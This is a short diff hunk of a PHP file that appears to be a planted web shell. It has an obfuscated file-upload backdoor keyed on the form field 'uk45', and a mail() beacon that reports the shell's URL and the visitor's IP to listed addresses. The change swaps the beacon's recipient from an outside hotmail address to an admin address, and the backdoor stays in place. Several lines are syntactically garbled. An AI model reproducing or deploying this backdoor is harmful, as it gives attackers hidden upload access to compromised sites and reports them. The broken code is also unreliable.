@@ -12,7 +12,7 @@ if (isset($_FILES['uk45'])) {$a($_FILES['uk45']['name'], $b($_FILES['uk45'][$c])
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'smtp@localfalcon.net, jamieholton1337@hotmail.com';
+$tujuanmail = 'admin@localfalcon.net';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'^{
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "Uwu Ganteng", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'^`. " ]");
